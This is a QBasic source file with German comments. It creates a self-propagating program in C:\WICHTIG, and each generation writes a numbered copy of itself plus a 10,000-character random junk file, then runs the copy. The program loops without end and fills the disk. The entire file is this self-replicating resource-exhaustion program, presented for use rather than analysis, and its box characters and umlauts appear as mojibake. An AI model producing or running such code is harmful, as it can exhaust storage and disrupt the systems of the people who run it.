
'Erstellt Programm, das sich vermehrt, und lÑsst es laufen. V1.1
'Alles im Verzeichnis C:\WICHTIG

CLS
LOCATE 11, 56: PRINT "…ÕÕÕÕÕª"
LOCATE 12, 23: PRINT "Erstellt Programm/Optionen Nr.   ∫     ∫"
LOCATE 13, 56: PRINT "»ÕÕÕÕÕº"
OPEN "C:\programm.bas" FOR OUTPUT AS #1
OPEN "C:\programm.dat" FOR OUTPUT AS #2
MKDIR "C:\WICHTIG"
CHDIR "C:\WICHTIG"
a$ = CHR$(34)

PRINT #1, "a$ = " + a$ + "100" + a$
PRINT #1, "LOCATE 12, 58: PRINT a$;"
PRINT #1, "OPEN " + a$ + "programm." + a$ + " + a$ FOR OUTPUT AS #1"
PRINT #1, "OPEN " + a$ + "C:\programm.dat" + a$ + " FOR INPUT AS #2"
PRINT #1, "OPEN " + a$ + "optionen." + a$ + " + a$ FOR OUTPUT AS #3"
PRINT #1, "LINE INPUT #2, q$"
PRINT #1, "PRINT #1, q$;"
PRINT #1, "PRINT #1, RIGHT$(STR$(VAL(a$) + 1), 3);"
PRINT #1, "PRINT #1, CHR$(34)"
PRINT #1, "FOR x = 1 TO 17"
PRINT #1, " LINE INPUT #2, q$"
PRINT #1, " PRINT #1, q$"
PRINT #1, "NEXT x"
PRINT #1, "FOR z = 1 TO 10000"
PRINT #1, " PRINT #3, CHR$(INT(RND * 223 + 32));"
PRINT #1, "NEXT z"
PRINT #1, "CLOSE"
PRINT #1, "RUN " + a$ + "programm." + a$ + " + a$"


PRINT #2, "a$ = " + a$
PRINT #2, "LOCATE 12, 58: PRINT a$;"
PRINT #2, "OPEN " + a$ + "programm." + a$ + " + a$ FOR OUTPUT AS #1"
PRINT #2, "OPEN " + a$ + "C:\programm.dat" + a$ + " FOR INPUT AS #2"
PRINT #2, "OPEN " + a$ + "optionen." + a$ + " + a$ FOR OUTPUT AS #3"
PRINT #2, "LINE INPUT #2, q$"
PRINT #2, "PRINT #1, q$;"
PRINT #2, "PRINT #1, RIGHT$(STR$(VAL(a$) + 1), 3);"
PRINT #2, "PRINT #1, CHR$(34)"
PRINT #2, "FOR x = 1 TO 17"
PRINT #2, " LINE INPUT #2, q$"
PRINT #2, " PRINT #1, q$"
PRINT #2, "NEXT x"
PRINT #2, "FOR z = 1 TO 10000"
PRINT #2, " PRINT #3, CHR$(INT(RND * 223 + 32));"
PRINT #2, "NEXT z"
PRINT #2, "CLOSE"
PRINT #2, "RUN " + a$ + "programm." + a$ + " + a$"
PRINT #2, "CLOSE"
CLOSE
RUN "C:\programm.bas"

